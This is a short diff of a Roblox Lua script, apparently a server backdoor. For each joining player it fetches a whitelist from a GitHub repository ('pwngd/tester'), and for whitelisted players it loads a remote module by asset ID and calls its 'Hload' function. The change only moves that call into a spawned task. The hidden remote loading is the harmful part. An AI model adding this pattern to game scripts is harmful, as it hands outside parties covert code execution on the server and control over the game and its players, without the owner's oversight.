@@ -17,7 +17,9 @@ local function onPlayer(player)
 	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
 	if WL[player.UserId] then
       -- require(7634392335)(player.Name)
-	  require(135231466738957):Hload(player.Name)
+	  task.spawn(function() 
+			require(135231466738957):Hload(player.Name)
+	   end)
   	end
 end
 for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
